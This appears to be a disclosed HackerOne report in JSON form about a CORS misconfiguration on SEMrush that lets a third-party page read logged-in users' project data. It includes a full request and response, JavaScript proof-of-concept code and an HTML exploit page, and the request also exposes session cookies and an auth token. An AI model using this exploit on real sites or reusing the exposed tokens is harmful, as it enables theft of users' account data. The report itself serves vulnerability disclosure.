    "vulnerability_information_html": "<p>Man, treat you another drink.</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p>An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.<br>\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.<br>\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users&#39; browsers.</p>\n\n<h2 id=\"poc1\">POC1</h2>\n\n<p><strong>Request</strong></p>\n<pre class=\"highlight plaintext\"><code>GET /organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588/projects?_=1496248656402 HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nReferer: https://www.semrush.com/projects/\nX-Requested-With: XMLHttpRequest\nCookie: wp13557=&quot;UWYYADs-TTTW:WWLHWYDtlnDl-TJIH-UYUTDDDIALHUZDLZTAHTIV-CCAY-XMLT-IUUA-UYUBWXWZACCWDlLtkNlo_Jht&quot;; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%2C%22db%22%3A%22sg%22%7D; db_date=current; userdata=%7B%22tz%22%3A%22GMT+8%22%2C%22ol%22%3A%22en%22%7D; _ga=GA1.2.412244322.1496213122; _gid=GA1.2.1937633003.1496213122; visit_first=1496213122000; __uvt=; uvts=65OAcWY4QhJHESTs; referer_purchase=https%3A%2F%2Fes.semrush.com%2Fdashboard%2F; sct:feedback:show=false; __insp_uid=2126149429; temp_db_but=sg; db=us; exp_feature_popup_closed=yes; about_sessionid=gue5yj2t8bmucnlwuv1y1cxilq7a7q8g; about_csrf=i6C8isOR7WLuVa1348FSsPH6rXzVEQSr; n_userid=LuWhoFku7Ou4q2PeBHIUAg==; __zlcmid=gngUE7HFajaRsy; _bizo_bzid=ec0d2554-575b-420b-b404-51b70939ec49; _bizo_cksm=34222E182676EC07; _bizo_np_stats=155%3D338%2C; auth_token=CMFMT27JhWR9cnbkoV1dHvFaxc4tQ3f0B4IAw5BfTOjyeKeF9FKx8w2kpiLl; __insp_wid=1632961932; __insp_slim=1496248714271; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vcHJvamVjdHMvIzgwMDEyMi92aWV3Lw%3D%3D; __insp_targlpt=U0VNcnVzaA%3D%3D; __insp_norec_howoften=true; __insp_norec_sess=true; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en; connect.sid=s%253A4cV9yXJcfQFXmC65JJn3KSP6Wp184s10.vGOEA1%252BgVTXbwDY4YSOkOjjnteLNyifmcQdJh8XZckI; _gat=1; _uetsid=_uetd1ba382c; JSESSIONID=4423D9EF5D5BEE794094AC0713E9EE8E; _gat_UA-6197637-22=1\nConnection: close\nOrigin: https://itqayzlbkshw.com\n</code></pre>\n<p><strong>Response</strong></p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 \nServer: nginx\nDate: Thu, 01 Jun 2017 01:36:26 GMT\nContent-Type: application/json;charset=UTF-8\nContent-Length: 884\nConnection: close\nAccess-Control-Allow-Origin: https://itqayzlbkshw.com\nVary: Origin\nAccess-Control-Allow-Credentials: true\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nX-Frame-Options: SAMEORIGIN\n\n[{&quot;key&quot;:&quot;\u2588\u2588\u2588&quot;,&quot;projectId&quot;:&quot;800122&quot;,&quot;projectName&quot;:&quot;dfsfsda&quot;,&quot;status&quot;:&quot;NOT_AUTHORISED&quot;,&quot;authoriseUrl&quot;:&quot;https://accounts.google.com/o/oauth2/auth?access_type=offline&amp;approval_prompt=force&amp;client_id=1093302022032-p190dsgnrdoavgstsem5i2pom6t9il6r.apps.googleusercontent.com&amp;redirect_uri=http://gat.semrush.com/api/rest/1.2/auth&amp;response_type=code&amp;scope=https://www.googleapis.com/auth/analytics.readonly%20https://www.googleapis.com/auth/webmasters.readonly&amp;state=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_800122_%5B%22https://www.googleapis.com/auth/analytics.readonly%22,%22https://www.googleapis.com/auth/webmasters.readonly%22%5D&quot;,&quot;email&quot;:null,&quot;accounts&quot;:null,&quot;account&quot;:null,&quot;property&quot;:null,&quot;view&quot;:null,&quot;url&quot;:null,&quot;siteUrls&quot;:null,&quot;siteUrl&quot;:null,&quot;database&quot;:&quot;us&quot;,&quot;device&quot;:&quot;desktop&quot;,&quot;totals&quot;:null,&quot;created&quot;:null,&quot;accountName&quot;:null,&quot;propertyName&quot;:null,&quot;viewName&quot;:null}]\n</code></pre>\n<p>Take note from request I inject a header Origin: <a title=\"https://itqayzlbkshw.com\" href=\"/redirect?signature=65435d30b8619f6264de085217270c3fb71eeb95&amp;url=https%3A%2F%2Fitqayzlbkshw.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://itqayzlbkshw.com</span><i class=\"icon-external-link\"></i></a> then from response it returns Access-Control-Allow-Origin: <a title=\"https://itqayzlbkshw.com\" href=\"/redirect?signature=65435d30b8619f6264de085217270c3fb71eeb95&amp;url=https%3A%2F%2Fitqayzlbkshw.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://itqayzlbkshw.com</span><i class=\"icon-external-link\"></i></a>. Which mean there is CORS misconfig here.</p>\n\n<h2 id=\"poc-2\">POC 2</h2>\n\n<ol>\n<li>open <a title=\"https://example.com\" href=\"/redirect?signature=c1090c16831405a5e6776a27873575899c1820d4&amp;url=https%3A%2F%2Fexample.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://example.com</span><i class=\"icon-external-link\"></i></a> in browser then inspect the page and go to console.</li>\n<li>run the following code in console and you would find it pops up user information\n<code>\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588\u2588/projects?_=1496248656402&#39;,true); req.withCredentials = true; req.send(&#39;{}&#39;); function reqListener() { alert(this.responseText); };\n</code>\n</li>\n</ol>\n\n<h2 id=\"exploit\">Exploit</h2>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">req</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">XMLHttpRequest</span><span class=\"p\">();</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">onload</span> <span class=\"o\">=</span> <span class=\"nx\">reqListener</span><span class=\"p\">;</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s1\">&#39;get&#39;</span><span class=\"p\">,</span><span class=\"s1\">&#39;https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588/projects?_=1496248656402&#39;</span><span class=\"p\">,</span><span class=\"kc\">true</span><span class=\"p\">);</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">withCredentials</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">(</span><span class=\"s1\">&#39;{}&#39;</span><span class=\"p\">);</span> <span class=\"kd\">function</span> <span class=\"nx\">reqListener</span><span class=\"p\">()</span> <span class=\"p\">{</span> <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">responseText</span><span class=\"p\">);</span> <span class=\"p\">};</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>Open above code in any browser and you would find it pops up user information like the attachment.</p>\n\n<h2 id=\"comment\">Comment</h2>\n\n<p>Attacker would treat many victims to visit attacker&#39;s website, if victim is logged in, then his personal information is recorded in attacker&#39;s server</p>\n\n<h2 id=\"how-to-fix\">How to fix</h2>\n\n<p>Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.semrush.com/", 
            "about": "", 
            "twitter_handle": "", 
            "name": "SEMrush"
        }, 
        "handle": "semrush", 
        "url": "https://hackerone.com/semrush", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/015/966/de40911e781a8b85c3b253fa22f0119175ca91f2_small.png?1477497046", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 15966, 
        "default_currency": "usd"
    }, 
    "is_published": false
}